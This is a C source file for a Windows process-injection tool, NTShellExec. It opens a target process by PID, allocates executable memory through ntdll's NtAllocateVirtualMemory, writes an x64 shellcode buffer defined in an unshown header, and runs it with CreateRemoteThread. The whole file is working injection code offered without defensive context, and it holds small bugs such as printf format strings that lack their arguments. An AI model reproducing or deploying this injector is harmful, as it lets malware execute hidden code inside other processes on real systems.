#include <stdio.h>
#include <stdlib.h>
#include <ntstatus.h>
#include <Windows.h>
#include "utils.h"

int NTShellExec(DWORD process_id);

int main(int argc, char* argv[]){
    printf("Loading NTShellExec.... \n\n");

    if(argc == 1 || argc >= 3){
        printf("Select one argument <file.exe> -> PID");
        return EXIT_FAILURE;
    }

    //get pid
    DWORD PID = atoi(argv[1]);

    NTShellExec(PID);

    return EXIT_SUCCESS;
}

int NTShellExec(DWORD process_id){

    //open handle to given process
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, process_id);

    if(hProcess == NULL){
        printf("error while attempting to get handle to process with PID : %ld -> error : %zd \n", process_id, GetLastError());
        return EXIT_FAILURE;
    };

    //ptr to AllocateVirtualMemory
    LPNTALLOCATEVIRTUALMEMORY ptrAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");

    if(ptrAllocateVirtualMemory == NULL){
        printf("unable to get ptr to NtAllocateVirtualMemory with error : %zd", GetLastError());
    }

    //params
    PVOID rBuffer = NULL;
    PSIZE_T sizeShellCode = sizeof(shellcode_x64);

    //allocate memory buffer
    NTSTATUS AVMstatus = ptrAllocateVirtualMemory(hProcess, &rBuffer, NULL, &sizeShellCode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if(AVMstatus != STATUS_SUCCESS){
        printf("unable to alloc memory...");
        return EXIT_FAILURE;
    }


    //ptr to WriteVirtualMemory
    LPWRITEVIRTUALMEMORY ptrWriteVirtualMemory = (LPWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtWriteVirtualMemory");

    if(ptrWriteVirtualMemory == NULL){
        printf("unable to get ptr to NtWriteVirtualMemory with error : %zd \n", GetLastError());
    }

    //write memory
    NTSTATUS WVMstatus = ptrWriteVirtualMemory(hProcess, rBuffer, shellcode_x64, (SIZE_T)(sizeof(shellcode_x64)), NULL);

    if(WVMstatus != STATUS_SUCCESS){
        printf("unable to write memory... \n");
        return EXIT_FAILURE;
    }

    printf("wrote %zd-bytes to allocated process memory\n", sizeof(shellcode_x64));

    LPDWORD thread_id = NULL;

    //creating thread to run shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, thread_id);

    if(hThread == NULL){
        printf("unable to get handle to new thread with error : %ld", GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s waiting for thread to finish executing\n");
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing, cleaning up\n");

    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s operation successfully made>>>>");
    
    return EXIT_SUCCESS;
}